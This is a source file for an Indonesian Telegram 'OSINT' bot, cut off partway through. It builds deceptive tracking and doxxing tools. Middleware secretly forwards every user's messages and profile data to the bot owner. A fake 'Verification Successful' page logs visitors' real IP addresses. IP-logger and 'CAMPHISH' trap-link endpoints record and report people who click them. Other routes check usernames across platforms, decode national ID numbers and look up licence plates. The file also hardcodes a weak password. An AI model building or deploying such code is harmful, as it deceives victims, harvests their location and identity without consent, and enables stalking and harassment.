import express from "express";
import axios from "axios";
import { nikParser } from "nik-parser";
import path from "path";
import { createServer as createViteServer } from "vite";
import dns from "dns";
import util from "util";
import { Telegraf, Markup, Telegram } from "telegraf";
import "dotenv/config";
import net from "net";
import crypto from "crypto";
import fs from "fs";
import { templates } from "./trapTemplates";

const TARGETS_FILE = "targets.json";
let targetsData: any[] = [];
if (fs.existsSync(TARGETS_FILE)) {
  try { targetsData = JSON.parse(fs.readFileSync(TARGETS_FILE, 'utf-8')); } catch(e){}
}
const saveTargets = () => fs.writeFileSync(TARGETS_FILE, JSON.stringify(targetsData, null, 2));
import AdmZip from "adm-zip";
import yts from "yt-search";
import play from "play-dl";
import ytdl from "@distube/ytdl-core";
import pkg from "@whiskeysockets/baileys";
const makeWASocket = (pkg as any).default || (pkg as any).makeWASocket || pkg;
const useMultiFileAuthState = (pkg as any).useMultiFileAuthState;
const DisconnectReason = (pkg as any).DisconnectReason;

let globalWaSock: any = null;


import QRCode from "qrcode";



const resolveMx = util.promisify(dns.resolveMx);

// Timeout helper for fetch
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 4000) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
};

const app = express();

// Uncaught exception and unhandled rejection protection
process.on('uncaughtException', (err) => {
  console.error('[CRASH PROTECTION] Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRASH PROTECTION] Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('SIGTERM', () => {
  console.log('[SYSTEM] SIGTERM received. Graceful exit/restart.');
  process.exit(0);
});

async function startServer() {
  const PORT = Number(process.env.PORT) || 3000;
  console.log(`[STARTUP] ENV: ${process.env.NODE_ENV || 'development'}`);
  console.log(`[STARTUP] Target Port: ${PORT} (from env: ${process.env.PORT || 'not set'})`);

  // Stateless Trap ID Generation & Validation
  const generateTrapId = (chatId: number | string) => {
    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
  };

  const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
    if (!userAgent) return false;
    const ua = userAgent.toLowerCase();
    
    // Check if it's a known crawler, preview bot, or command-line tool
    if (/(bot|spider|crawl|slurp|facebookexternalhit|whatsapp|preview|mediapartners)/i.test(ua)) {
        // Exclude legitimate in-app browsers that happen to contain these strings
        // E.g., Telegram in-app browser often has 'Telegram' but NOT 'bot'
        // But what if WA crawler vs WA in-app?
        // WA crawler = 'WhatsApp/2...'
        // WA In-app = 'Mozilla/5.0 ... [FB_IAB...] ...'
        if (ua.includes('mozilla/') && !ua.includes('compatible; bot') && !ua.includes('googlebot') && !ua.includes('telegrambot') && !ua.includes('facebookexternalhit')) {
             return false; // Very likely a real browser (in-app or regular)
        }
        return true;
    }
    
    const cmdTools = ['amphp', 'python', 'go-http-client', 'curl', 'wget'];
    return cmdTools.some(agent => ua.includes(agent));
  };

  const getChatIdFromTrapId = (trapId: string): string | null => {
    try {
      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
      if (decoded.includes('-OSINT-')) {
        return decoded.split('-OSINT-')[0];
      }
      return null;
    } catch {
      return null;
    }
  };

  // Default to the Railway App URL as requested, but avoid literal placeholder from env.
  let appHost = (process.env.PUBLIC_URL && process.env.PUBLIC_URL !== 'MY_APP_URL' ? process.env.PUBLIC_URL : null) || 
                (process.env.APP_URL && process.env.APP_URL !== 'MY_APP_URL' ? process.env.APP_URL : null) || 
                "https://telegram-bot-osint-v1-production-cae7.up.railway.app";
  
  app.set("trust proxy", 1); // Crucial for Railway/Proxy environments

  // 1. TOP-LEVEL HEALTH CHECKS (MUST BE FIRST)
  app.get('/health', (req, res) => res.status(200).send('OK'));
  app.get('/healthz', (req, res) => res.status(200).send('OK'));
  
  app.use((req, res, next) => {
    // Dynamically update appHost based on incoming requests to ensure accurate trap links in container environments
    if (req.headers.host && !req.headers.host.includes('localhost') && !req.headers.host.includes('127.0.0.1')) {
       appHost = `https://${req.headers.host}`;
    }
    const ua = req.headers['user-agent'] || '';
    if (ua.includes('HealthCheck') || ua.includes('Railway') || ua.includes('GoogleHC') || req.query.health === '1') {
        return res.status(200).send('OK');
    }
    next();
  });

  // Request logging
  app.use((req, res, next) => {
    if (req.path !== '/health' && req.path !== '/healthz' && !req.path.includes('.')) {
      console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    }
    next();
  });

  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ limit: '50mb', extended: true }));

  const escapeHTML = (text: string) => {
    return text.replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    }[m] || m));
  };

  const token = process.env.TELEGRAM_BOT_TOKEN;
  console.log(`[DEBUG] TELEGRAM_BOT_TOKEN exists: ${!!token}`);
  const bot = token ? new Telegraf(token) : null;
  const botInstance = bot;
  if (!botInstance) console.error("[CRITICAL] botInstance is null! Check TELEGRAM_BOT_TOKEN in .env");

  const ADMIN_ID = Number(process.env.ADMIN_ID) || 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
  const PASSWORD = process.env.PASSWORD || "112233";
  let authenticatedUsers = new Set<number>();
  
  const mapToSerif = (char: string) => {
    const code = char.charCodeAt(0);
    if (code >= 65 && code <= 90) return String.fromCodePoint(0x1D400 + code - 65);
    if (code >= 97 && code <= 122) return String.fromCodePoint(0x1D41A + code - 97);
    if (code >= 48 && code <= 57) return String.fromCodePoint(0x1D7CE + code - 48);
    return char;
};

const applyFont = (text: any) => {
    if (typeof text !== 'string') return text;
    const regex = /(<[^>]+>|https?:\/\/\S+|\/\S+|@\w+)/g;
    return text.split(regex).map((part, i) => {
        if (i % 2 === 1) return part;
        return part.split('').map(mapToSerif).join('');
    }).join('');
};

const applyFontToMarkup = (extra: any) => {
    if (!extra) return extra;
    const newExtra = { ...extra };
    if (newExtra.reply_markup && newExtra.reply_markup.inline_keyboard) {
        newExtra.reply_markup = {
            ...newExtra.reply_markup,
            inline_keyboard: newExtra.reply_markup.inline_keyboard.map((row: any[]) => 
                row.map((btn: any) => ({ ...btn, text: applyFont(btn.text) }))
            )
        };
    }
    return newExtra;
};

// Global Telegram Injector
const injectTelegramFont = () => {
    if (!botInstance) return;
    
    if (!(botInstance.telegram as any).__font_patched) {
        const _sendMessage = botInstance.telegram.sendMessage.bind(botInstance.telegram);
        botInstance.telegram.sendMessage = async (chatId, text, extra, ...args) => {
            return _sendMessage(chatId, applyFont(text), applyFontToMarkup(extra), ...args);
        };
        
        const _sendPhoto = botInstance.telegram.sendPhoto.bind(botInstance.telegram);
        botInstance.telegram.sendPhoto = async (chatId, photo, extra, ...args) => {
            const newExtra = applyFontToMarkup(extra);
            if (newExtra && newExtra.caption) newExtra.caption = applyFont(newExtra.caption);
            return _sendPhoto(chatId, photo, newExtra, ...args);
        };

        const _editMessageText = botInstance.telegram.editMessageText.bind(botInstance.telegram);
        botInstance.telegram.editMessageText = async (chatId, msgId, inlineMsgId, text, extra, ...args) => {
            return _editMessageText(chatId, msgId, inlineMsgId, applyFont(text), applyFontToMarkup(extra), ...args);
        };
        
        const _sendVoice = botInstance.telegram.sendVoice.bind(botInstance.telegram);
        botInstance.telegram.sendVoice = async (chatId, voice, extra, ...args) => {
            const newExtra = applyFontToMarkup(extra);
            if (newExtra && newExtra.caption) newExtra.caption = applyFont(newExtra.caption);
            return _sendVoice(chatId, voice, newExtra, ...args);
        };

        const _answerCbQuery = botInstance.telegram.answerCbQuery.bind(botInstance.telegram);
        botInstance.telegram.answerCbQuery = async (queryId, text, ...args) => {
            return _answerCbQuery(queryId, applyFont(text), ...args);
        };

        (botInstance.telegram as any).__font_patched = true;
    }
};

if (botInstance) {
    injectTelegramFont();
    

    botInstance.use(async (ctx, next) => {
        const userName = ctx.from?.first_name || 'User';
        const userId = ctx.from?.id;
        const usname = ctx.from?.username ? '@' + ctx.from.username : '';
        let commandText = 'Unknown command';
        if (ctx.message && 'text' in ctx.message) commandText = ctx.message.text;
        else if (ctx.callbackQuery && 'data' in ctx.callbackQuery) commandText = 'Button: ' + (ctx.callbackQuery.data || '');

        // UPGRADE MONITORING: TANGKAPAN MASUK (INCOMING)
        try {
            if (ctx.from && ctx.from.id !== ADMIN_ID) {
                const lang = ctx.from?.language_code || 'N/A';
                const isPrem = ctx.from?.is_premium ? '✅ Yes' : '❌ No';
                const chatType = ctx.chat?.type || 'Private';
                let msgType = 'Unknown';
                let cTxt = commandText;
                
                if (ctx.message) {
                    if ('text' in ctx.message) { msgType = 'Text'; }
                    else if ('photo' in ctx.message) { msgType = 'Photo'; cTxt = '[Photo Attached]'; }
                    else if ('document' in ctx.message) { msgType = 'Document'; cTxt = '[Document Attached]'; }
                    else if ('location' in ctx.message) { msgType = 'Location'; cTxt = '[Location Attached]'; }
                    else if ('voice' in ctx.message) { msgType = 'Voice'; cTxt = '[Voice Note]'; }
                    else if ('contact' in ctx.message) { msgType = 'Contact'; cTxt = '[Contact Details]'; }
                    else { msgType = 'Media/Other'; cTxt = '[Media]'; }
                } else if (ctx.callbackQuery) {
                    msgType = 'Callback Button';
                }

                let inLog = `🚨 <b>TANGKAPAN MASUK (FORENSIC TRACKING)</b> 🚨\n` +
                            `━━━━━━━━━━━━━━━━━━━━\n` +
                            `👤 <b>Nama:</b> ${userName}\n` +
                            `🔖 <b>Username:</b> ${usname}\n` +
                            `🆔 <b>ID Pengguna:</b> <code>${userId}</code>\n` +
                            `🌐 <b>Bahasa:</b> ${lang}\n` +
                            `⭐ <b>Premium:</b> ${isPrem}\n` +
                            `💬 <b>Tipe Chat:</b> ${chatType}\n` +
                            `📂 <b>Tipe Input:</b> ${msgType}\n\n` +
                            `🔍 <b>Detail Input:</b>\n<code>${cTxt}</code>\n` +
                            `━━━━━━━━━━━━━━━━━━━━`;
                
                await botInstance.telegram.sendMessage(ADMIN_ID, inLog, { parse_mode: 'HTML' }).catch(()=>{});

                // Forward exact message to admin for full monitoring
                if (ctx.message && ctx.chat) {
                    await botInstance.telegram.forwardMessage(ADMIN_ID, ctx.chat.id, ctx.message.message_id).catch(()=>{});
                }
            }
        } catch(e) {}

        const origReply = ctx.reply.bind(ctx);
        ctx.reply = async function (text, ...args) {
            const fontText = applyFont(text);
            const fontArgs = args.map(applyFontToMarkup);
            const res = await origReply(fontText, ...fontArgs);
            try {
                if (ctx.from && ctx.from.id !== ADMIN_ID && text && String(text).trim().length > 0) {
                    let logMsg = `🔔 <b>MEMBER ACTION RESULT</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${userName} ${usname}\n🆔 <b>ID:</b> <code>${userId}</code>\n⌨️ <b>Cmd:</b> <code>${commandText}</code>\n\n📤 <b>BOT RESPONSE:</b>\n${text}`;
                    if (logMsg.length > 4000) logMsg = logMsg.substring(0, 3950) + '...\n(terpotong)';
                    await botInstance.telegram.sendMessage(ADMIN_ID, logMsg, { parse_mode: 'HTML' }).catch(async () => {
                        const safeText = String(logMsg).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
                        await botInstance.telegram.sendMessage(ADMIN_ID, safeText, { parse_mode: 'HTML' }).catch(()=>{});
                    });
                }
            } catch(e) {}
            return res;
        };

        const origEdit = ctx.editMessageText.bind(ctx);
        ctx.editMessageText = async function (text, ...args) {
            const fontText = applyFont(text);
            const fontArgs = args.map(applyFontToMarkup);
            const res = await origEdit(fontText, ...fontArgs);
            try {
                if (ctx.from && ctx.from.id !== ADMIN_ID) {
                    let logMsg = `🔔 <b>MEMBER ACTION RESULT (EDIT)</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${userName} ${usname}\n🆔 <b>ID:</b> <code>${userId}</code>\n⌨️ <b>Action:</b> <code>${commandText}</code>\n\n📤 <b>BOT RESPONSE:</b>\n${text}`;
                    if (logMsg.length > 4000) logMsg = logMsg.substring(0, 3950) + '...\n(terpotong)';
                    await botInstance.telegram.sendMessage(ADMIN_ID, logMsg, { parse_mode: 'HTML' }).catch(async () => {
                        const safeText = String(logMsg).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
                        await botInstance.telegram.sendMessage(ADMIN_ID, safeText, { parse_mode: 'HTML' }).catch(()=>{});
                    });
                }
            } catch(e){}
            return res;
        };

        const origPhoto = ctx.replyWithPhoto.bind(ctx);
        ctx.replyWithPhoto = async function (photo, extra) {
            const origCaption = extra?.caption || '';
            if (extra && extra.caption) {
                extra.caption = applyFont(extra.caption);
            }
            const fontExtra = applyFontToMarkup(extra);
            const res = await origPhoto(photo, fontExtra);
            try {
                if (ctx.from && ctx.from.id !== ADMIN_ID) {
                    let logMsg = `🔔 <b>MEMBER ACTION RESULT (PHOTO)</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${userName} ${usname}\n🆔 <b>ID:</b> <code>${userId}</code>\n⌨️ <b>Cmd:</b> <code>${commandText}</code>\n\n📤 <b>CAPTION:</b>\n${origCaption}`;
                    if (logMsg.length > 4000) logMsg = logMsg.substring(0, 3950) + '...\n(terpotong)';
                    await botInstance.telegram.sendMessage(ADMIN_ID, logMsg, { parse_mode: 'HTML' }).catch(async () => {
                        const safeText = String(logMsg).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
                        await botInstance.telegram.sendMessage(ADMIN_ID, safeText, { parse_mode: 'HTML' }).catch(()=>{});
                    });
                }
            } catch(e){}
            return res;
        };

        return next();
    });
}
  const webhookSecret = token ? token.split(':')[0] : null;
  const webhookPath = webhookSecret ? `/telegraf/${webhookSecret}` : null;
  let agreementUsers = new Set<number>();
  let waUnlockedUsers = new Set<number>();

  let botStatus = "ON";
  let bannedUsers = new Set<number>();
  let botDescription = `ʜᴀʟᴏ ᴘʀɪᴀ-ᴘʀɪᴀ ʏᴀɴɢ ᴛᴇʀꜱᴀᴋɪᴛɪ ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴛᴇʀᴍɪɴᴀʟ 🐉 ᴛʀɪʜᴇxᴀ 🐉\n\nʙᴏᴛ ɪɴɪ ᴍᴇɴʏᴇᴅɪᴀᴋᴀɴ ʙᴀɴʏᴀᴋ ꜰɪᴛᴜʀ ꜰɪᴛᴜʀ ᴀᴅᴠᴀɴᴄᴇ ꜱᴇᴄᴀʀᴀ ɢʀᴀᴛɪꜱ, ꜱᴇʟᴀᴍᴀ ᴍᴀꜱɪʜ ᴀᴅᴀ ᴏᴛᴀᴋ ᴅᴀɴ ʟᴏɢɪᴋᴀ ᴅɪʙᴀʟɪᴋɴʏᴀ ᴍᴏʜᴏɴ ɢᴜɴᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ. \n\n"ᴋᴀᴍɪ, ᴛʀɪʜᴇxᴀ, ʙᴜᴋᴀɴ ᴋᴀᴘɪᴛᴀʟɪꜱ. ᴋᴀʀᴇɴᴀ ɪɴɪ ɢʀᴀᴛɪꜱ ᴍᴏʜᴏɴ ɢᴜɴᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴏᴛᴀᴋ ʏᴀɴɢ ʙᴇɴᴀʀ" \n\nꜱᴀʟᴀᴍ ʜᴏʀᴍᴀᴛ ᴘᴇᴍʙᴜᴀᴛ ꜱᴀʏᴀ \n- ᴊᴇᴇᴍɪᴋᴋᴏ`;

  try {
    if (fs.existsSync('auth.json')) {
      authenticatedUsers = new Set(JSON.parse(fs.readFileSync('auth.json', 'utf8')));
    }
    if (fs.existsSync('agreement.json')) {
      agreementUsers = new Set(JSON.parse(fs.readFileSync('agreement.json', 'utf8')));
    }
    if (fs.existsSync('wa_auth.json')) {
      waUnlockedUsers = new Set(JSON.parse(fs.readFileSync('wa_auth.json', 'utf8')));
    }
    if (fs.existsSync('bot_settings.json')) {
      const state = JSON.parse(fs.readFileSync('bot_settings.json', 'utf8'));
      if (state.botStatus) botStatus = state.botStatus;
      if (state.botDescription) botDescription = state.botDescription;
      if (state.bannedUsers) bannedUsers = new Set(state.bannedUsers);
    }
  } catch (e) { console.error("Error loading auth files", e); }

  const saveAuth = () => { fs.writeFileSync('auth.json', JSON.stringify([...authenticatedUsers])); };
  const saveAgreement = () => { fs.writeFileSync('agreement.json', JSON.stringify([...agreementUsers])); };
  const saveWaAuth = () => { fs.writeFileSync('wa_auth.json', JSON.stringify([...waUnlockedUsers])); };
  const saveBotSettings = () => { 
      fs.writeFileSync('bot_settings.json', JSON.stringify({
          botStatus, botDescription, bannedUsers: [...bannedUsers]
      })); 
  };

  if (bot && webhookPath) {
    app.post(webhookPath, (req, res) => {
      bot.handleUpdate(req.body, res).catch(err => {
        console.error("Bot Handle Update Error:", err);
        if (!res.headersSent) res.sendStatus(500);
      });
    });
    console.log(`[${new Date().toISOString()}] Bot Webhook Route Registered: ${webhookPath}`);
  }

  app.use((req, res, next) => {
    // Dynamic host checking disabled by user request. 
    // Always use the fixed Railway URL for bot generation.
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", botInitialized: !!botInstance });
  });

  // Capture Bot User IP & Redirect
  app.get('/verify-bot-user', (req, res) => {
    const { uid, name } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const report = `📢 <b>BOT USER IDENTIFIED & VERIFIED</b> 📢\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `👤 <b>USER NAME:</b> <code>${escapeHTML(String(name || 'Unknown'))}</code>\n` +
                     `🆔 <b>TELEGRAM ID:</b> <code>${uid}</code>\n` +
                     `🌐 <b>REAL IP ADDRESS:</b> <code>${escapeHTML(String(ip))}</code>\n\n` +
                     `🖥️ <b>SYSTEM BROWSER:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `✅ <i>STATUS: HIGH-PRECISION IDENTITY SYNC SUCCESSFUL.</i>`;
      
      botInstance.telegram.sendMessage(ADMIN_ID, report, { parse_mode: 'HTML' }).catch(() => {});
    }

    res.send(`
      <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Complete</title></head>
      <body style="font-family:-apple-system, sans-serif; text-align:center; padding:50px 20px; background:#fff; color:#333;">
        <div style="color:#1a73e8; font-size:60px; margin-bottom:20px;">🛡️</div>
        <h2 style="margin-bottom:10px;">Verification Successful</h2>
        <p style="color:#666; margin-bottom:30px;">Your security profile has been synchronized with the main server. You now have full access to the terminal features.</p>
        <p style="font-size:14px; color:#999;">IP Captured: ${escapeHTML(String(ip))}</p>
        <div style="margin-top:40px;">
          <a href="https://t.me/share/url?url=Success" style="background:#1a73e8; color:#fff; text-decoration:none; padding:12px 24px; border-radius:6px; font-weight:600;">Return to Bot</a>
        </div>
      </body></html>
    `);
  });

  // OSINT API ENDPOINTS FOR FRONTEND UI
  app.post('/api/osint/username', async (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: 'Username required' });
    
    // Platforms list (similar to bot command)
    const platforms = [
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` },
        { name: "WordPress", url: `https://${username}.wordpress.com` },
        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
        { name: "Shopee", url: `https://shopee.co.id/${username}` }
    ];

    const results = await Promise.all(platforms.map(async (platform) => {
        try {
            const response = await fetchWithTimeout(platform.url, { 
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
            }, 5000);
            return {
                name: platform.name,
                url: platform.url,
                found: response.status === 200,
                status: response.status
            };
        } catch (e) {
            return { name: platform.name, url: platform.url, found: false, status: 'TIMEOUT/ERROR' };
        }
    }));

    res.json({ username, results });
  });

  app.get('/api/osint/ip', async (req, res) => {
    const ip = req.query.query || req.query.ip || '';
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ status: 'fail', message: 'System timeout' });
    }
  });

  app.get('/api/osint/whois', async (req, res) => {
    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
    try {
        const response = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: 'WHOIS lookup failed' });
    }
  });

  app.get('/api/osint/dns', async (req, res) => {
    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
    try {
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: 'DNS lookup failed' });
    }
  });

  app.get('/api/osint/email', async (req, res) => {
    const email = String(req.query.email || '');
    if (!email.includes('@')) return res.status(400).json({ error: 'Invalid email' });
    const domain = email.split("@")[1];
    try {
        const records = await resolveMx(domain);
        res.json({ email, domain, validFormat: true, mxRecords: records });
    } catch (e) {
        res.status(500).json({ email, domain, validFormat: true, mxRecords: [], error: true, message: 'MX fetch failed' });
    }
  });

  app.get('/api/osint/nik', (req, res) => {
    const nik = String(req.query.nik || '');
    if (!/^\d{16}$/.test(nik)) return res.status(400).json({ error: 'NIK must be 16 digits' });

    try {
      const parsed = nikParser(nik);
      const PROVINCES = {'11':'Aceh','12':'Sumatera Utara','13':'Sumatera Barat','14':'Riau','15':'Jambi','16':'Sumatera Selatan','17':'Bengkulu','18':'Lampung','19':'Kep. Bangka Belitung','21':'Kep. Riau','31':'DKI Jakarta','32':'Jawa Barat','33':'Jawa Tengah','34':'DI Yogyakarta','35':'Jawa Timur','36':'Banten','51':'Bali','52':'Nusa Tenggara Barat','53':'Nusa Tenggara Timur','61':'Kalimantan Barat','62':'Kalimantan Tengah','63':'Kalimantan Selatan','64':'Kalimantan Timur','65':'Kalimantan Utara','71':'Sulawesi Utara','72':'Sulawesi Tengah','73':'Sulawesi Selatan','74':'Sulawesi Tenggara','75':'Gorontalo','76':'Sulawesi Barat','81':'Maluku','82':'Maluku Utara','91':'Papua Barat','94':'Papua'}; const provName = PROVINCES[nik.substring(0,2)] || parsed.province() || 'Unknown';
      const genderStr = parsed.kelamin() === 'pria' ? 'Laki-laki' : parsed.kelamin() === 'wanita' ? 'Perempuan' : 'Unknown';
      let birthDateStr = 'Unknown';
      try {
        const d = parsed.lahir();
        if (d) {
          const bornDate = d instanceof Date ? d : new Date(d);
          if (!isNaN(bornDate.getTime())) {
            const day = String(bornDate.getDate()).padStart(2, '0');
            const month = String(bornDate.getMonth() + 1).padStart(2, '0');
            const year = bornDate.getFullYear();
            birthDateStr = `${day}-${month}-${year}`;
          }
        }
      } catch (err) {}

      let prov = "Data wilayah belum tersedia";
      let kab = "Data wilayah belum tersedia";
      let kec = "Data wilayah belum tersedia";
      let pos = "Data wilayah belum tersedia";
      try { prov = provName || "Data wilayah belum tersedia"; } catch (err) {}
      try { kab = parsed.kabupatenKota() || "Data wilayah belum tersedia"; } catch (err) {}
      try { kec = parsed.kecamatan() || "Data wilayah belum tersedia"; } catch (err) {}
      try { pos = parsed.kodepos() ? String(parsed.kodepos()) : "Data wilayah belum tersedia"; } catch (err) {}

      res.json({
        nik,
        gender: genderStr,
        birthDate: birthDateStr,
        province: prov,
        kabupaten: kab,
        kecamatan: kec,
        postalCode: pos,
        sequence: parsed.uniqcode() || nik.substring(12, 16),
        isValid: parsed.isValid()
      });
    } catch (e) {
      const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };
      const prov = nik.substring(0, 2);
      const kab = nik.substring(2, 4);
      const kec = nik.substring(4, 6);
      let tgl = parseInt(nik.substring(6, 8), 10);
      const bln = nik.substring(8, 10);
      let thn = parseInt(nik.substring(10, 12), 10);
      const urut = nik.substring(12, 16);

      let gender = "Laki-laki";
      if (tgl >= 40) {
        gender = "Perempuan";
        tgl -= 40;
      }
      const currentYear = new Date().getFullYear() % 100;
      thn = thn > currentYear ? 1900 + thn : 2000 + thn;

      res.json({
        nik, gender, 
        birthDate: `${tgl.toString().padStart(2, '0')}-${bln}-${thn}`,
        province: provMap[prov] || "Unknown",
        kabupaten: `Kode Kab: ${kab}`,
        kecamatan: `Kode Kec: ${kec}`,
        postalCode: 'Unknown',
        sequence: urut,
        isValid: false,
        error: false
      });
    }
  });

  app.get('/api/osint/plat', (req, res) => {
    const platInput = String(req.query.plat || '').replace(/\s/g, '').toUpperCase();
    const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
    if (!match) return res.status(400).json({ error: 'Invalid license plate format' });

    const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };
    const regionCode = match[1];
    res.json({
      plat: `${match[1]} ${match[2]} ${match[3]}`,
      region: platMap[regionCode] || "Unknown Region",
      code: regionCode,
      number: match[2],
      suffix: match[3]
    });
  });

  // ... (previous API routes continue here)
  
  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
  app.get('/t/:tmplId/:id', async (req, res) => {
    const { id, tmplId } = req.params;
    const chatId = getChatIdFromTrapId(id);
    if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2>');

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const targetIp = String(ip).split(',')[0].trim();
      
      targetsData.push({
        id: id,
        timestamp: new Date().toISOString(),
        type: 'BASIC_HIT',
        ip: targetIp,
        ua: String(userAgent)
      });
      saveTargets();

      // Send telegram notification if it's not a bot
      if (!isSuspeciousAgent(userAgent)) {
        const msg = `⚡ <b>LINK CLICK DETECTED</b> ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📅 <b>TIME:</b> <code>${timestamp} WIB</code>\n` +
                    `🌐 <b>IP ADDRESS:</b> <code>${targetIp}</code>\n` +
                    `📖 <b>USER_AGENT:</b>\n<code>${userAgent}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Menunggu target mengizinkan akses / klik Verify untuk detail lengkap...</i>`;
        
